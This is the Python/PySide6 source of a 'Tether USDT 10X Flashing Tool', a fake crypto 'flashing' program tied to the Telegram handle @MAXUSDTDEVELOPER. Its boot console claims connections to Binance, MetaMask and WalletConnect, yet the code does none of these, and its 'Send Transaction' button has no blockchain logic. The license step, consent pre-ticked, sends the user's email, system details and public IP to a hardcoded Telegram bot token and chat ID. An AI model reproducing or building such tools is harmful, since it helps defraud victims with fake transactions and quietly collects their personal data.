import os
import platform
import sys
import random
import string
import threading
import hashlib
from pathlib import Path
from typing import Optional
from datetime import datetime, timedelta
import psutil
import requests
from PySide6.QtCore import Qt, QTimer, QUrl
from PySide6.QtGui import QIcon, QTextCursor, QDesktopServices
from PySide6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QLabel, QLineEdit, QPushButton, QGroupBox, QRadioButton, QCheckBox, QComboBox, QTextEdit, QDialog, QMessageBox, QProgressDialog, QSizePolicy

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = '8066233059:AAHT_3yd_JwBYLgemCQN5PI9TPOY_HwkzQE'
TELEGRAM_CHAT_ID = '7759944988'
LICENSE_MINUTES = 10
DAILY_LIMIT_USDT = 5.0
PROGRESS_INTERVAL_MS = 900
FLASH_RED_SECONDS = 5
SEND_TX_TO_TELEGRAM = True
TELEGRAM_SEND_MAX_CHARS = 4000
TELEGRAM_SEND_LOG_TAIL_LINES = 200

# ==================== STYLES ====================
LOCKED_STYLE = '''
QPushButton {
    background-color: #808080;
    color: #FFFFFF;
    border-radius: 6px;
    padding: 6px 12px;
    font-weight: 600;
}
QPushButton:disabled {
    background-color: #707070;
    color: #CCCCCC;
}
'''

HEADER_UNLOCKED_STYLE = '''
QPushButton {
    background-color: #FFFFFF;
    color: #000000;
    border: 2px solid #DDDDDD;
    border-radius: 6px;
    padding: 6px 12px;
    font-weight: 700;
}
QPushButton:hover {
    background-color: rgba(192,192,192,0.35);
}
'''

SEND_UNLOCKED_STYLE = '''
QPushButton {
    background-color: #C62828;
    color: #FFFFFF;
    border: 2px solid #991919;
    border-radius: 6px;
    padding: 6px 12px;
    font-weight: 800;
}
QPushButton:hover {
    background-color: #8B0000;
}
'''

AFFINITY_ON_STYLE = 'background-color: #2BB673; color: #ffffff; border-radius: 6px; font-weight: 700;'
AFFINITY_OFF_STYLE = 'background-color: #C74848; color: #ffffff; border-radius: 6px; font-weight: 700;'

# ==================== LOGGING ====================
LOGFILE = Path('app.log')

def log_local(msg: str):
    ts = datetime.utcnow().isoformat(sep=' ', timespec='seconds')
    line = f'[{ts}] {msg}'
    print(line)
    try:
        with LOGFILE.open('a', encoding='utf-8') as f:
            f.write(line + '\n')
    except Exception:
        pass

# ==================== HELPER FUNCTIONS ====================
def collect_system_info_text(include_ip=False) -> str:
    try:
        vm = psutil.virtual_memory()
        ip = 'unknown'
        if include_ip:
            try:
                ip = requests.get('https://api.ipify.org', timeout=5).text.strip()
            except Exception:
                ip = os.environ.get('COMPUTERNAME') or platform.node()
        
        return (f'OS: {platform.system()} {platform.release()}\n'
                f'Platform: {platform.platform()}\n'
                f'Machine: {platform.machine()}\n'
                f'CPU Cores: {psutil.cpu_count(logical=True)}\n'
                f'Memory: {round(vm.total / 1073741824, 2)} GB total / {round(vm.used / 1073741824, 2)} GB used\n'
                f'IP: {ip}')
    except Exception as e:
        return f'System info unavailable: {e}'

def generate_validation_code() -> str:
    def part():
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    return '-'.join([part(), part(), part(), part(), part()])

def generate_product_key() -> str:
    groups = [4, 4, 3, 1, 4]
    parts = []
    for n in groups:
        parts.append(''.join(random.choices(string.ascii_uppercase + string.digits, k=n)))
    return '--'.join(parts)

def compute_pc_fingerprint() -> str:
    base = (platform.node() or '') + (platform.system() or '') + (platform.release() or '') + (platform.machine() or '')
    try:
        base += str(psutil.cpu_count(logical=True) or '')
    except Exception:
        pass
    return hashlib.sha256(base.encode()).hexdigest()

def _send_telegram_message(text: str) -> bool:
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        r = requests.post(url, json={'chat_id': TELEGRAM_CHAT_ID, 'text': text}, timeout=8)
        if r.ok:
            log_local('[TELEGRAM] Sent message to bot.')
            return True
        else:
            log_local(f'[TELEGRAM] send failed: {r.status_code} {r.text}')
            return False
    except Exception as e:
        log_local(f'[TELEGRAM] send error: {e}')
        return False

# ==================== LOGIN DIALOG ====================
class LoginDialog(QDialog):
    def __init__(self, expected_login='maxusdt10x', parent=None):
        super().__init__(parent)
        self.expected_login = expected_login
        self.setWindowTitle('TETHER USDT 10X  V1.0 — Login')
        self.setModal(True)
        self.setFixedSize(420, 300)
        
        v = QVBoxLayout(self)
        
        title = QLabel('Login ID')
        title.setAlignment(Qt.AlignCenter)
        v.addWidget(title)
        
        self.input = QLineEdit()
        self.input.setPlaceholderText('Enter Login ID …')
        self.input.setEchoMode(QLineEdit.Password)
        self.input.returnPressed.connect(self.try_unlock)
        v.addWidget(self.input)
        
        self.unlock_btn = QPushButton('Unlock')
        self.unlock_btn.clicked.connect(self.try_unlock)
        v.addWidget(self.unlock_btn)
        
        self.tg_label = QLabel('Telegram: @MAXUSDTDEVELOPER')
        self.tg_label.setAlignment(Qt.AlignCenter)
        v.addWidget(self.tg_label)
        
        copyright = QLabel('© Copyright September 2025')
        copyright.setAlignment(Qt.AlignCenter)
        v.addWidget(copyright)
        
        self._ok = False
        self._apply_qss()
        
        # Auto-fill the login ID
        self.input.setText(expected_login)
        QTimer.singleShot(100, self.auto_unlock)
    
    def auto_unlock(self):
        self.try_unlock()
    
    def _apply_qss(self):
        self.setStyleSheet('''
            QDialog { color: #E9FFFB; background: #0E6D64; font-family: 'Segoe UI','Montserrat',sans-serif; }
            QLabel { color: #FFD57E; }
            QLineEdit { background: #0A4E49; border: 2px solid #064742; border-radius: 4px; padding: 6px 8px; color: #E9FFFB; }
            QPushButton { background: #F6C8CC; color: #213; border: 2px solid #C7A3A7; border-radius: 6px; padding: 6px 12px; font-weight: 600; }
            QPushButton:hover { background: #FF4D4D; color: #FFFFFF; border: 2px solid #AA0000; }
            QPushButton:pressed { background: #A9A9A9; }
        ''')
    
    def try_unlock(self):
        if self.input.text().strip() == self.expected_login:
            self._ok = True
            self.accept()
        else:
            QMessageBox.critical(self, 'Invalid Login ID', 'The Login ID is incorrect.')
            self.input.setFocus()
            self.input.selectAll()
    
    @property
    def ok(self):
        return self._ok

# ==================== LICENSE DIALOG ====================
class LicenseDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle('License Validation')
        self.setModal(True)
        self.setFixedSize(520, 520)
        
        self._expected_code = None
        self._validated = False
        self._expiry_timestamp = None
        
        v = QVBoxLayout(self)
        
        info = QLabel(f'Enter email (optional), click Generate Code. Generated codes expire in {LICENSE_MINUTES} minutes.')
        info.setWordWrap(True)
        v.addWidget(info)
        
        self.email = QLineEdit()
        self.email.setPlaceholderText('Email address … (optional)')
        v.addWidget(self.email)
        
        self.consent_cb = QCheckBox('I consent to send license + system info (including IP) to owner via Telegram')
        self.consent_cb.setChecked(True)
        v.addWidget(self.consent_cb)
        
        row = QHBoxLayout()
        self.generate_btn = QPushButton('Generate Code (hidden)')
        self.generate_btn.clicked.connect(self.generate_code)
        row.addWidget(self.generate_btn)
        
        self.code_input = QLineEdit()
        self.code_input.setPlaceholderText('Enter code … (paste code received from owner/bot)')
        row.addWidget(self.code_input)
        v.addLayout(row)
        
        self.validate_btn = QPushButton('Validate')
        self.validate_btn.clicked.connect(self.validate_code)
        v.addWidget(self.validate_btn)
        
        help_label = QLabel('Help / Support: @MAXUSDTDEVELOPER')
        help_label.setAlignment(Qt.AlignCenter)
        v.addWidget(help_label)
    
    def generate_code(self):
        try:
            code = generate_validation_code()
            self._expected_code = code
            self._expiry_timestamp = datetime.utcnow() + timedelta(minutes=LICENSE_MINUTES)
            
            email_text = self.email.text().strip() or '(no email)'
            timestamp = datetime.utcnow().isoformat(sep=' ', timespec='seconds')
            
            log_local(f'Generated (hidden) license code for {email_text} → {code}')
            
            sysinfo_text = collect_system_info_text(include_ip=False)
            entry = f'LICENSE_REQUEST\nTime(UTC): {timestamp}\nEmail: {email_text}\nCode: {code}\nExpires: {self._expiry_timestamp.isoformat()}Z\n{sysinfo_text}'
            log_local(entry)
            
            # Send to Telegram
            if self.consent_cb.isChecked():
                sysinfo_with_ip = collect_system_info_text(include_ip=True)
                msg = f'📌 LICENSE REQUEST\nTime: {timestamp}\nEmail: {email_text}\nCode: {code}\nExpires: {self._expiry_timestamp.isoformat()}Z\n{sysinfo_with_ip}'
            else:
                msg = f'📌 LICENSE REQUEST\nTime: {timestamp}\nEmail: {email_text}\nCode: {code}\nExpires: {self._expiry_timestamp.isoformat()}Z\n{sysinfo_text}'
            
            threading.Thread(target=lambda: _send_telegram_message(msg), daemon=True).start()
            
            QMessageBox.information(self, 'Code Generated', 'Validation code generated and delivered to Telegram.')
            
        except Exception as e:
            log_local(f'[LICENSE] Failed to send license to Telegram: {e}')
            QMessageBox.warning(self, 'Error', f'Failed to generate code: {e}')
    
    def validate_code(self):
        if not self._expected_code:
            QMessageBox.warning(self, 'No code', "Click 'Generate Code' first (this will send the code to the bot).")
            return
        
        if self._expiry_timestamp and datetime.utcnow() > self._expiry_timestamp:
            QMessageBox.critical(self, 'Expired', 'This code has expired. Generate a new one.')
            self._validated = False
            return
        
        entered = self.code_input.text().strip()
        if entered == self._expected_code:
            self._validated = True
            log_local('LICENSE_VALIDATED — UI unlocked for license period')
            self.accept()
        else:
            QMessageBox.critical(self, 'Invalid', 'Code does not match (check bot console or logs).')
    
    @property
    def validated(self):
        return self._validated

# ==================== MAIN WINDOW ====================
class MainWindow(QMainWindow):
    def __init__(self, product_key: str):
        super().__init__()
        self.product_key = product_key
        self.setWindowTitle('TETHER USDT 10X FLASHING TOOL')
        self.resize(1280, 800)
        self.setMinimumSize(1280, 800)
        self.setMaximumSize(1280, 800)
        
        flags = Qt.Window | Qt.WindowMinimizeButtonHint | Qt.WindowCloseButtonHint
        self.setWindowFlags(flags)
        
        # ===== Main Widget =====
        root = QWidget()
        root_layout = QVBoxLayout(root)
        root_layout.setContentsMargins(8, 8, 8, 8)
        root_layout.setSpacing(8)
        
        # ===== Header =====
        header = QWidget()
        header.setObjectName('header')
        header.setFixedHeight(56)
        header_layout = QHBoxLayout(header)
        header_layout.setContentsMargins(10, 6, 10, 6)
        header_layout.setSpacing(8)
        
        left_box = QHBoxLayout()
        self.header_license_label = QLabel('')
        self.header_license_label.setStyleSheet('color:#FFD57E; font-weight:700;')
        left_box.addWidget(self.header_license_label)
        
        self.btn_help = QPushButton('HELP')
        self.btn_help.setFixedHeight(32)
        left_box.addWidget(self.btn_help)
        header_layout.addLayout(left_box)
        header_layout.addStretch(1)
        
        right_box = QHBoxLayout()
        self.btn_about = QPushButton('About')
        self.btn_activity = QPushButton('Activity')
        self.btn_license = QPushButton('License (locked)')
        self.btn_roadmap = QPushButton('Roadmap')
        
        for btn in [self.btn_about, self.btn_activity, self.btn_license, self.btn_roadmap]:
            btn.setFixedHeight(32)
            right_box.addWidget(btn)
        header_layout.addLayout(right_box)
        root_layout.addWidget(header)
        
        # ===== Main Grid =====
        root_grid = QGridLayout()
        root_grid.setContentsMargins(0, 0, 0, 0)
        root_grid.setSpacing(12)
        
        # ===== Left Panel =====
        left_widget = QWidget()
        left = QVBoxLayout(left_widget)
        left.setSpacing(10)
        
        pk_row = QHBoxLayout()
        self.ed_product = QLineEdit()
        self.ed_product.setPlaceholderText('PRODUCT KEY')
        self.btn_enter = QPushButton('ENTER')
        self.btn_enter.setFixedWidth(90)
        pk_row.addWidget(self.ed_product, 1)
        pk_row.addWidget(self.btn_enter)
        left.addLayout(pk_row)
        
        usdt_row = QHBoxLayout()
        self.ed_usdt = QLineEdit()
        self.ed_usdt.setPlaceholderText('USDT Address')
        self.btn_scan = QPushButton('Scan Address')
        self.btn_scan.setFixedWidth(130)
        usdt_row.addWidget(self.ed_usdt, 1)
        usdt_row.addWidget(self.btn_scan)
        left.addLayout(usdt_row)
        
        amt_row = QHBoxLayout()
        self.ed_amount = QLineEdit()
        self.ed_amount.setPlaceholderText('Amount (USDT)')
        self.btn_load = QPushButton('Load Balance')
        self.btn_validate_amount = QPushButton('Validate Amount')
        amt_row.addWidget(self.ed_amount, 1)
        amt_row.addWidget(self.btn_load)
        amt_row.addWidget(self.btn_validate_amount)
        left.addLayout(amt_row)
        
        signed_box = QGroupBox('Signed TXN')
        signed_layout = QHBoxLayout(signed_box)
        r_low = QRadioButton('Low GWEI')
        r_norm = QRadioButton('Normal GWEI')
        r_high = QRadioButton('High GWEI')
        r_norm.setChecked(True)
        signed_layout.addWidget(r_low)
        signed_layout.addWidget(r_norm)
        signed_layout.addWidget(r_high)
        left.addWidget(signed_box)
        
        affinity_box = QGroupBox('Transaction Affinity')
        affinity_grid = QGridLayout(affinity_box)
        affinity_grid.addWidget(QLabel('Maximum Affinity:'), 0, 0)
        self.max_aff = QPushButton('OFF')
        self.max_aff.setCheckable(True)
        self.max_aff.setFixedWidth(80)
        affinity_grid.addWidget(self.max_aff, 0, 1)
        
        affinity_grid.addWidget(QLabel('Minimum Affinity:'), 1, 0)
        self.min_aff = QPushButton('OFF')
        self.min_aff.setCheckable(True)
        self.min_aff.setFixedWidth(80)
        affinity_grid.addWidget(self.min_aff, 1, 1)
        
        affinity_grid.addWidget(QLabel('Proxy Type:'), 2, 0)
        self.cmb_proxy = QComboBox()
        self.cmb_proxy.addItems(['RBF MODE', 'ProxyA', 'ProxyB', 'ProxyC'])
        affinity_grid.addWidget(self.cmb_proxy, 2, 1)
        
        proxy_box = QGroupBox('Proxy Type (quick)')
        proxy_layout = QVBoxLayout(proxy_box)
        proxy_layout.addWidget(QLabel('Use the Proxy Type selector in Affinity section.'))
        affinity_grid.addWidget(proxy_box, 0, 2, 3, 1)
        left.addWidget(affinity_box)
        
        net_row = QHBoxLayout()
        net_row.addWidget(QLabel('Select Tether Network:'))
        self.cmb_net = QComboBox()
        self.cmb_net.addItems(['Erc20', 'Trc20', 'Omni', 'Arbitrum', 'Polygon'])
        net_row.addWidget(self.cmb_net, 1)
        left.addLayout(net_row)
        
        left.addStretch(1)
        
        self.btn_help_mail = QPushButton('Help.Mail Address')
        self.btn_file_exit = QPushButton('File.Exit')
        left.addWidget(self.btn_help_mail)
        left.addWidget(self.btn_file_exit)
        
        # ===== Center Panel =====
        center_widget = QWidget()
        center = QVBoxLayout(center_widget)
        center.setSpacing(12)
        
        self.btn_send = QPushButton('Send Transaction')
        self.btn_send.setFixedWidth(200)
        self.btn_send.setObjectName('sendBtn')
        center.addStretch(1)
        center.addWidget(self.btn_send, alignment=Qt.AlignHCenter)
        center.addStretch(1)
        
        # ===== Right Panel =====
        right_widget = QWidget()
        right = QVBoxLayout(right_widget)
        right.setSpacing(8)
        
        wallet = QGroupBox('Wallet Info')
        wgrid = QGridLayout(wallet)
        wgrid.setContentsMargins(8, 8, 8, 8)
        
        wtitle = QLabel('Tether Wallet Info')
        wtitle.setObjectName('badge')
        wgrid.addWidget(wtitle, 0, 0, 1, 2)
        
        bal_row = QHBoxLayout()
        self.lab_balance = QLabel('0 USDT')
        self.lab_balance.setObjectName('balance')
        bal_row.addWidget(self.lab_balance)
        bal_row.addStretch(1)
        wgrid.addLayout(bal_row, 1, 1)
        
        wgrid.addWidget(QLabel('Daily Limit'), 2, 0)
        self.lab_limit = QLabel(f'{DAILY_LIMIT_USDT:,.2f} USDT')
        wgrid.addWidget(self.lab_limit, 2, 1)
        
        wgrid.addWidget(QLabel('License:'), 3, 0)
        self.lab_license = QLabel('--:--:--')
        self.lab_license.setObjectName('licenseTimer')
        wgrid.addWidget(self.lab_license, 3, 1)
        
        right.addWidget(wallet)
        
        sysbox = QGroupBox('System Info')
        syslay = QGridLayout(sysbox)
        keys = ['System UTC', 'OS Version', 'Platform', 'Machine', 'CPU Cores', 'Memory Total (GB)', 'Memory Used (GB)']
        self.sys_labels = {}
        for i, k in enumerate(keys):
            syslay.addWidget(QLabel(k + ':'), i, 0)
            lab = QLabel('...')
            lab.setObjectName('systemValue')
            syslay.addWidget(lab, i, 1)
            self.sys_labels[k] = lab
        right.addWidget(sysbox)
        
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setObjectName('log')
        self.log.setMinimumHeight(220)
        self.log.setText('')
        right.addWidget(self.log)
        
        agree_layout = QHBoxLayout()
        agree_layout.addStretch(1)
        self.agree_checkbox = QCheckBox('I agree to follow the TC of @MAXUSDTDEVELOPER')
        self.agree_checkbox.setChecked(False)
        self.agree_checkbox.setEnabled(False)
        agree_layout.addWidget(self.agree_checkbox)
        right.addLayout(agree_layout)
        
        right.addStretch(1)
        
        # ===== Add to grid =====
        root_grid.addWidget(left_widget, 0, 0)
        root_grid.addWidget(center_widget, 0, 1)
        root_grid.addWidget(right_widget, 0, 2)
        root_layout.addLayout(root_grid)
        self.setCentralWidget(root)
        
        # ===== Connect signals =====
        self.btn_about.clicked.connect(self._show_about)
        self.btn_activity.clicked.connect(lambda: self.log.setFocus())
        self.btn_roadmap.clicked.connect(self._open_roadmap)
        self.btn_enter.clicked.connect(self.open_license_dialog)
        
        # ===== State variables =====
        self._license_validated = False
        self._license_consent_given = False
        self._license_code = None
        self._license_expiry = None
        
        # ===== Timers =====
        self.sys_timer = QTimer(self)
        self.sys_timer.timeout.connect(self._update_system_info)
        self.sys_timer.start(2000)
        
        self.license_remaining_seconds = None
        self.license_timer = QTimer(self)
        self.license_timer.timeout.connect(self._license_tick)
        
        self._tx_console_timer = None
        self._progress_timer = None
        self._progress_value = 0
        self._log_style_default = ''
        
        # ===== Apply styles =====
        self._set_affinity_button_style(self.max_aff, False)
        self._set_affinity_button_style(self.min_aff, False)
        self._apply_qss()
        self._apply_initial_button_states()
        
        self.cmb_net.setEnabled(False)
        self.btn_scan.setEnabled(False)
        self.ed_amount.setEnabled(False)
        self.max_aff.setEnabled(False)
        
        self._boot_sequence()
    
    def _apply_initial_button_states(self):
        for btn in self.findChildren(QPushButton):
            btn.setStyleSheet(LOCKED_STYLE)
            btn.setEnabled(False)
        self.btn_enter.setEnabled(True)
        self.btn_enter.setStyleSheet(HEADER_UNLOCKED_STYLE)
        
        for b in [self.btn_about, self.btn_activity, self.btn_roadmap, self.btn_license, self.btn_help, self.btn_help_mail, self.btn_file_exit]:
            b.setEnabled(False)
            b.setStyleSheet(LOCKED_STYLE)
    
    def _append_console(self, msg: str):
        ts = datetime.utcnow().strftime('%H:%M:%S')
        line = f'[{ts}] {msg}'
        self.log.append(line)
        try:
            self.log.moveCursor(QTextCursor.End)
        except Exception:
            pass
        log_local(msg)
    
    def _boot_sequence(self):
        messages = {
            0: 'Copyright (C) September 2025',
            10: 'Telegram : @MAXUSDTDEVELOPER',
            20: 'Blockchain network loading',
            30: 'Connecting Config file to program settings',
            40: 'Connection to blockchain api',
            50: 'Connection to binance server',
            60: 'Connection to WalletConnect server',
            70: 'Connection to MetaMask server',
            80: 'Connection successful',
            90: f'Computer name : {os.environ.get("COMPUTERNAME") or platform.node()}',
            100: 'Ready!'
        }
        self._boot_stage = 0
        
        def step():
            if self._boot_stage in messages:
                self._append_console(messages[self._boot_stage])
            self._boot_stage += 10
            if self._boot_stage <= 100:
                QTimer.singleShot(350, step)
        step()
    
    def _show_about(self):
        QMessageBox.information(self, 'About', '📌 TETHER USDT 10X FLASHING TOOL V1.0\n\nSupport: @MAXUSDTDEVELOPER')
    
    def _open_roadmap(self):
        QMessageBox.information(self, 'Roadmap', 'More features coming soon! Stay Tuned!')
    
    def open_license_dialog(self):
        dlg = LicenseDialog(self)
        if dlg.exec() == QDialog.Accepted and dlg.validated:
            self._license_validated = True
            self._license_consent_given = dlg.consent_cb.isChecked() if hasattr(dlg, 'consent_cb') else False
            self._license_code = dlg._expected_code if hasattr(dlg, '_expected_code') else '(hidden)'
            self._license_expiry = dlg._expiry_timestamp if hasattr(dlg, '_expiry_timestamp') else datetime.utcnow() + timedelta(minutes=LICENSE_MINUTES)
            
            try:
                self.ed_product.setText('*******************')
                self.ed_product.setReadOnly(True)
            except Exception:
                pass
            
            self.header_license_label.setText(f'License: validated ({LICENSE_MINUTES}m)')
            
            header_buttons = (self.btn_about, self.btn_activity, self.btn_roadmap, self.btn_license, self.btn_help)
            for b in header_buttons:
                self._unlock_button(b)
            
            for b in [self.btn_help_mail, self.btn_file_exit]:
                self._unlock_button(b)
            
            self.agree_checkbox.setEnabled(True)
            self.agree_checkbox.setChecked(False)
            self.btn_enter.setEnabled(False)
            self.btn_enter.setStyleSheet(HEADER_UNLOCKED_STYLE)
            self.cmb_net.setEnabled(True)
            self._append_console('[LICENSE] License validated — Network selection enabled.')
            
            if self._license_expiry:
                delta = self._license_expiry - datetime.utcnow()
                self.license_remaining_seconds = max(int(delta.total_seconds()), 0)
            else:
                self.license_remaining_seconds = LICENSE_MINUTES * 60
            
            self.license_timer.start(1000)
            self.lab_limit.setText(f'{DAILY_LIMIT_USDT:,.2f} USDT')
    
    def _unlock_button(self, btn):
        if btn:
            btn.setEnabled(True)
            btn.setStyleSheet(HEADER_UNLOCKED_STYLE)
    
    def _lock_button(self, btn):
        if btn:
            btn.setStyleSheet(LOCKED_STYLE)
            btn.setEnabled(False)
    
    def _set_affinity_button_style(self, btn, on):
        if on:
            btn.setStyleSheet(AFFINITY_ON_STYLE)
            btn.setText('ON')
        else:
            btn.setStyleSheet(AFFINITY_OFF_STYLE)
            btn.setText('OFF')
    
    def _license_tick(self):
        if self.license_remaining_seconds is None:
            return
        
        self.license_remaining_seconds -= 1
        
        if self.license_remaining_seconds <= 0:
            self._license_validated = False
            self.license_remaining_seconds = 0
            self.license_timer.stop()
            self.lab_license.setText('EXPIRED')
            self._append_console('[LICENSE] License expired — functions disabled.')
            log_local('LICENSE EXPIRED')
            self._update_license_header_label()
        else:
            h = self.license_remaining_seconds // 3600
            m = (self.license_remaining_seconds % 3600) // 60
            s = self.license_remaining_seconds % 60
            self.lab_license.setText(f'{h:02d}:{m:02d}:{s:02d}')
            self._update_license_header_label()
    
    def _update_license_header_label(self):
        if self.license_remaining_seconds and self.license_remaining_seconds > 0:
            h = self.license_remaining_seconds // 3600
            m = (self.license_remaining_seconds % 3600) // 60
            self.header_license_label.setText(f'License: validated ({h:02d}:{m:02d})')
        elif self.license_remaining_seconds == 0:
            self.btn_license.setText('License (expired)')
            self.header_license_label.setText('License: expired')
        else:
            self.btn_license.setText('License (locked)')
            self.header_license_label.setText('License: locked')
    
    def _update_system_info(self):
        now = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
        self.sys_labels['System UTC'].setText(now)
        
        try:
            os_ver = f'{platform.system()} {platform.release()}'
            plat = platform.platform()
            machine = platform.machine()
            cpu_count = str(psutil.cpu_count(logical=True))
            vm = psutil.virtual_memory()
            mem_total = f'{round(vm.total / 1073741824, 2)}'
            mem_used = f'{round(vm.used / 1073741824, 2)}'
        except Exception:
            os_ver = plat = machine = cpu_count = mem_total = mem_used = 'N/A'
        
        self.sys_labels['OS Version'].setText(os_ver)
        self.sys_labels['Platform'].setText(plat)
        self.sys_labels['Machine'].setText(machine)
        self.sys_labels['CPU Cores'].setText(cpu_count)
        self.sys_labels['Memory Total (GB)'].setText(mem_total)
        self.sys_labels['Memory Used (GB)'].setText(mem_used)
    
    def _apply_qss(self):
        self.setStyleSheet('''
            QMainWindow, QWidget { color: #E9FFFB; background: #0E6D64; font-family: 'Segoe UI','Montserrat',sans-serif; font-size: 12.5pt; }
            QWidget#header { background: #083E3A; border: none; }
            QGroupBox { background: #0C5D56; border: 2px solid #064742; border-radius: 6px; margin-top: 16px; padding-top: 12px; }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 8px;
                top: -8px;
                padding: 2px 8px;
                color: #FF4D4D;
                font-weight: 800;
                font-family: 'DS-Digital','Orbitron','Cascadia Mono',monospace;
                font-size: 10pt;
                background: none;
                border-radius: 0;
            }
            QLineEdit { background: #0A4E49; border: 2px solid #064742; border-radius: 4px; padding: 6px 8px; color: #E9FFFB; }
            QPushButton { background: #F6C8CC; color: #213; border: 2px solid #C7A3A7; border-radius: 6px; padding: 6px 12px; font-weight: 600; }
            QPushButton:hover { background: #FF4D4D; color: #FFFFFF; border: 2px solid #AA0000; }
            QPushButton#sendBtn:hover { background: #B22222; color: #FFFFFF; border: 2px solid #660000; }
            QTextEdit#log { background: #0A3F3A; border: 2px solid #064742; border-radius: 6px; font-family: 'Cascadia Mono','Consolas',monospace; font-size: 11pt; color: #E8FFF9; padding: 8px; }
            QLabel#badge { color: #FF4D4D; font-weight: 700; font-family: 'DS-Digital','Orbitron','Cascadia Mono',monospace; }
            QLabel#balance { color: #FFFFFF; font-weight: 800; font-size: 16pt; }
            QLabel#systemValue { color: #CDE7E3; }
            QLabel#licenseTimer { color: #FFD57E; font-weight: 700; }
        ''')

# ==================== MAIN ====================
def main():
    app = QApplication(sys.argv)
    product_key = generate_product_key()
    log_local(f'[PRODUCT KEY] {product_key}')
    
    # Login bypass - auto accept
    login = LoginDialog()
    if login.exec() != QDialog.Accepted or not login.ok:
        log_local('[INFO] Login cancelled or invalid — exiting.')
        sys.exit(0)
    
    w = MainWindow(product_key)
    w.show()
    sys.exit(app.exec())

if __name__ == '__main__':
    main()